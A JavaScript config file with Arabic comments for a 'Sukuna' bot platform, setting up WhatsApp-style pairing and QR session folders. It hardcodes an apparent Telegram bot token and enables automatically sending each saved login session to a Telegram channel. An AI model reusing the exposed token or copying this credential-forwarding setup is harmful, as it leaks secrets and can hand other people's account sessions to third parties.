/**
 * ═══════════════════════════════════════════════════════
 * ⚙️ PLATFORM CONFIG | إعدادات منصة سوكونا
 * ═══════════════════════════════════════════════════════
 * 👑 المطور: آدم (شادو) | Adam (Shadow)
 * 🤖 البوت: سوكونا | Sukuna
 * 📜 الوصف: إعدادات موقع الربط + بوت مراقبة الجلسات
 * ═══════════════════════════════════════════════════════
 */

import { fileURLToPath } from 'url'
import path from 'path'

const __dirname = path.dirname(fileURLToPath(import.meta.url))

export const config = {
  // ═══ إعدادات السيرفر ═══
  PORT: process.env.PORT || 8000,

  // ═══ إعدادات الجلسات ═══
  sessionsDir: path.join(__dirname, 'sessions'),
  subSessionsDir: path.join(__dirname, 'sessions', 'session-sub'),
  pairSessionsDir: path.join(__dirname, 'pair_sessions'),
  qrSessionsDir: path.join(__dirname, 'qr_sessions'),

  // ═══ إعدادات بوت التليجرام ═══
  telegram: {
    token: '8343902916:AAFyuOZBNYFPrTMKxHhq6tEaqte8RpRmmAA',
    // معرف قناة أو جروب الجلسات (لازم يكون البوت أدمن فيه)
    sessionsChannel: '@sukuna_sessions',
    // معرف المطورين اللي هيتبعتلهم إشعارات
    owners: ('7374743956').split(',').filter(Boolean),
    // كل كام ثانية يفحص الفولدر
    checkInterval: 10000
  },

  // ═══ إعدادات الربط ═══
  pairing: {
    // هل يحفظ الجلسة تلقائي بعد الربط
    autoSave: true,
    // هل يبعت الجلسة على التليجرام
    sendToTelegram: true,
    // هل يحذف الجلسة المؤقتة بعد الحفظ
    cleanupAfter: 30000,
    // تأخير طلب كود الربط (1 ثانية للسرعة الفائقة زي بوت الواتساب)
    pairingDelay: 1000,
    // مهلة الـ QR
    qrTimeout: 60000,
    // أقصى عدد محاولات إعادة الاتصال
    maxReconnectAttempts: 3
  },

  // ═══ معلومات المنصة ═══
  platform: {
    name: 'Sukuna Platform',
    botName: 'Sukuna Bot',
    developer: 'Adam (Shadow)',
    version: '2.0.0',
    team: 'Sukuna Team'
  }
}

export default config